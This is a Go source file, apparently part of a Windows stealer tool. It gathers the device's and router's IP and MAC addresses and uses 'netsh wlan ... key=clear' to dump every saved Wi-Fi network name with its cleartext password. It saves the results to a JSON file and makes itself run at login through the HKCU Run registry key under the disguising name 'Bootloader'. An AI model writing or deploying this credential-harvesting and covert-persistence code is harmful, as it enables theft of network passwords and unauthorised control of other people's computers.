package utils

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"regexp"
	"strings"

	"golang.org/x/sys/windows/registry"
)

type WiFiProfile struct {
	SSID     string `json:"ssid"`
	Password string `json:"password"`
	Auth     string `json:"auth"`
}

type CollectedData struct {
	DeviceIP  string        `json:"device_ip"`
	RouterIP  string        `json:"router_ip"`
	DeviceMAC string        `json:"device_mac"`
	RouterMAC string        `json:"router_mac"`
	Profiles  []WiFiProfile `json:"wifi_profiles"`
	Timestamp string        `json:"timestamp"`
}

// CollectWiFiInfo returns all collected WiFi data (IP, MAC, SSID, Password, etc.)
func CollectWiFiInfo() []WiFiProfile {
	var profiles []WiFiProfile
	out, err := exec.Command("cmd", "/C", "netsh wlan show profiles").Output()
	if err != nil {
		return profiles
	}

	re := regexp.MustCompile(`All User Profile\s*:\s*(.+)`)
	matches := re.FindAllStringSubmatch(string(out), -1)

	for _, match := range matches {
		ssid := strings.TrimSpace(match[1])
		if ssid != "" {
			profile := getWiFiProfileDetails(ssid)
			profiles = append(profiles, profile)
		}
	}

	return profiles
}

// GetDeviceIP returns the private IP address of the device
func GetDeviceIP() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return ""
	}

	for _, i := range interfaces {
		addrs, err := i.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					return ipnet.IP.String()
				}
			}
		}
	}

	return ""
}

// GetRouterIP returns the router's IP address (default gateway)
func GetRouterIP() string {
	out, err := exec.Command("cmd", "/C", "ipconfig").Output()
	if err != nil {
		return ""
	}

	re := regexp.MustCompile(`Default Gateway[ .]*:\s*([\d.]+)`)
	match := re.FindStringSubmatch(string(out))
	if len(match) > 1 {
		return match[1]
	}

	return ""
}

// GetDeviceMAC returns the MAC address of the device
func GetDeviceMAC() string {
	interfaces, _ := net.Interfaces()
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp != 0 && len(iface.HardwareAddr) > 0 {
			return iface.HardwareAddr.String()
		}
	}
	return ""
}

// GetRouterMAC returns the MAC address of the router (if retrievable)
func GetRouterMAC() string {
	routerIP := GetRouterIP()
	if routerIP == "" {
		return ""
	}

	out, err := exec.Command("cmd", "/C", "arp -a "+routerIP).Output()
	if err != nil {
		return ""
	}

	re := regexp.MustCompile(`\s+` + regexp.QuoteMeta(routerIP) + `\s+([a-f0-9:-]+)`)
	match := re.FindStringSubmatch(string(out))
	if len(match) > 1 {
		return match[1]
	}

	return ""
}

// getWiFiProfileDetails returns details for a specific Wi-Fi profile (SSID, Password, Authentication)
func getWiFiProfileDetails(ssid string) WiFiProfile {
	escapedSSID := fmt.Sprintf("\"%s\"", ssid)
	out, err := exec.Command("cmd", "/C", "netsh wlan show profile name="+escapedSSID+" key=clear").Output()
	if err != nil {
		return WiFiProfile{SSID: ssid}
	}

	output := string(out)
	reKey := regexp.MustCompile(`Key Content\s*:\s*(.+)`)
	reAuth := regexp.MustCompile(`Authentication\s*:\s*(.+)`)

	password := ""
	auth := ""

	if match := reKey.FindStringSubmatch(output); len(match) > 1 {
		password = match[1]
	}

	if match := reAuth.FindStringSubmatch(output); len(match) > 1 {
		auth = match[1]
	}

	return WiFiProfile{
		SSID:     ssid,
		Password: password,
		Auth:     auth,
	}
}

// Save the collected data to a JSON file
func SaveToJSON(data CollectedData, filename string) {
	file, err := os.Create(filename)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	err = json.NewEncoder(file).Encode(data)
	if err != nil {
		fmt.Println("Error encoding JSON data:", err)
	}
}

// Add program to Windows registry for autorun
func AddToRegistry() {
	exePath, err := os.Executable()
	if err != nil {
		fmt.Println("Error getting executable path:", err)
		return
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		fmt.Println("Error opening registry:", err)
		return
	}
	defer key.Close()

	// Set a registry entry that runs the executable on startup
	err = key.SetStringValue("Bootloader", exePath)
	if err != nil {
		fmt.Println("Error setting registry value:", err)
		return
	}

	fmt.Println("Program added to startup registry!")
}
